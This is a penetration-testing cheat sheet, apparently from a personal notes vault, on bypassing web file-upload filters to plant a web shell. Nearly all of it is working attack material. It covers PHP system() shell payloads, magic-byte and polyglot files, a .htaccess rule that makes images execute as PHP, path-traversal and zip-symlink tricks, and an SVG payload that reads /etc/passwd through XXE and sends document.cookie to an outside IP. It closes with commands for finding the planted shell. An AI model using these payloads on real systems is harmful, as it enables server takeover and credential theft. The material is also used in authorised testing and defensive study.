---
tags: [pentest, file-upload, bypass, web, initial-access]
phase: 5
---
# File Upload Bypass

When the app has a file upload and you want to upload a web shell, but there's *some* filter.

[[06 - Gaining Access/00 - README|Folder index]]

## Diagnose the filter

Upload these and observe response:

```text
shell.php           ← outright blacklist?
shell.PhP           ← case-sensitive blacklist?
shell.php.jpg       ← double-extension
shell.jpg.php       ← parsing order
shell.phtml         ← alternative PHP extension
shell.php5          ← extension allowlist gap
shell.php7
shell.pht
shell.shtml         ← SSI
shell.phar
shell.inc           ← if "include" in app code
```

## Bypass approaches

### 1. Content-Type / MIME swap

Browser sends `Content-Type: image/jpeg` for the upload. If server checks only that header:

```http
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['c']); ?>
```

### 2. Magic-byte prepending

Server validates first bytes:

```text
GIF89a;<?php system($_GET['c']);?>
\x89PNG\r\n\x1a\n<?php ... ?>
\xFF\xD8\xFF<?php ... ?>           ← JPEG
%PDF-1.4<?php ... ?>
```

Save as `shell.php` but it starts with magic bytes. Upload, then access via web.

### 3. Polyglot files

Real image + appended PHP:

```bash
# Genuine 1x1 GIF + PHP shell
echo -e 'GIF89a;\n<?php system($_GET["c"]); ?>' > shell.gif
mv shell.gif shell.php           # or upload as .php.gif depending on filter
```

Or use a tool:

```bash
ExifTool -DocumentName="<?php system(\$_GET['c']); ?>" image.jpg
```

### 4. Double extension

```text
shell.php.jpg            ← Apache <2.4 mod_php parses leftmost recognized ext
shell.jpg.php
shell.png.phtml
```

### 5. Null byte (PHP < 5.3.4 only)

```text
shell.php%00.jpg
```

### 6. Unicode / homoglyph

```text
shell.pｈp           ← fullwidth Latin small letter H
shell.phⓟ            ← circled P
```

### 7. .htaccess upload (Apache)

Upload `.htaccess` containing:

```apache
AddType application/x-httpd-php .jpg .png .gif
```

Then upload `shell.jpg` containing `<?php ... ?>`. Server now parses .jpg as PHP.

### 8. Path manipulation

Filename `../../shell.php` (path traversal in filename):

```text
filename="../../../../tmp/shell.php"
filename="..\..\..\windows\temp\shell.php"
```

### 9. ZIP / archive uploads

If the app extracts uploaded archives:

- Symlink to `/etc/passwd` inside zip
- Path traversal in entry names: `../../../var/www/html/shell.php`

```bash
zip --symlinks shell.zip /etc/passwd
zip evil.zip $(echo "../../var/www/html/shell.php")    # see also evilarc.py
```

### 10. SVG upload (when image)

SVG is XML → XXE + JS-in-image:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="500" height="500">
  <text>&xxe;</text>
  <script type="application/javascript">
    fetch('http://10.10.14.5/?c='+document.cookie)
  </script>
</svg>
```

(JS in SVG only runs if displayed in browser context.)

### 11. Web shell types per platform

| Server | Extension(s) that execute |
| --- | --- |
| Apache + PHP | .php, .phtml, .php5, .phar |
| nginx + PHP-FPM | .php (depends on `location ~ \.php$` config) |
| IIS + .NET | .aspx, .asmx, .ashx, .cshtml |
| IIS + classic ASP | .asp, .cer |
| Tomcat | .jsp, .jspx |
| nginx + uwsgi | .py (depends on app) |
| Apache CGI | .cgi, .pl |

## Find where it went

After upload, find the path:

```bash
# Common locations to try
http://target/uploads/shell.php
http://target/files/shell.php
http://target/images/shell.php
http://target/userfiles/shell.php
http://target/static/uploads/shell.php

# Burp Repeater: look for the path in the upload response (often disclosed)
# If hidden, dir brute the uploads directory
gobuster dir -u http://target/uploads -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

## When you see X, do Y

| Symptom | Action |
| --- | --- |
| "Invalid file type" | Try MIME swap, then extensions, then magic bytes |
| Upload succeeds but file 404 | Look for path normalization stripping `../`; or the file's saved elsewhere |
| File saved but doesn't execute | Check the actual extension; check if app puts files in non-exec dir |
| Path traversal worked but no shell | Apache may have `<Directory>` config preventing .php execution outside webroot |

> [!tip] Burp + .htaccess combo
> When you have ANY upload accepting ANY filename, try uploading `.htaccess` first. If it sticks, you control how the server parses subsequent uploads.

## See also

- [[../11 - Shells Transfer Hashes/08 - PHP Web Shells]]
- [[../11 - Shells Transfer Hashes/09 - JSP Web Shells (Tomcat)]]
